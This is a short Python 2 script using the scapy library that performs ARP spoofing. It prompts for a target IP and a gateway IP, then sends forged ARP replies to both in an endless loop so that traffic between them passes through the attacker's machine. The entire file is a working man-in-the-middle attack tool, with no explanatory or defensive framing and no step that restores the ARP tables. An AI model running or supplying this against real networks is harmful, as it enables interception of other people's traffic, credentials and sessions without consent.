import scapy.all as scapy
import time
import argparse
import sys
from getmac import get_mac_address

def spoofer(targetIP, spoofIP):
    destinationMac=mac=get_mac_address(ip=targetIP)
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
    scapy.send(packet, verbose=False)

targetIP=raw_input("enter your target ip address")
gatewayIP=raw_input("enter your gateway ip address")

packets=0

while True:
        spoofer(targetIP,gatewayIP)
        spoofer(gatewayIP,targetIP)
        print("\r[+] Sent packets "+ str(packets)),
        sys.stdout.flush()
        packets +=2
        time.sleep(2)

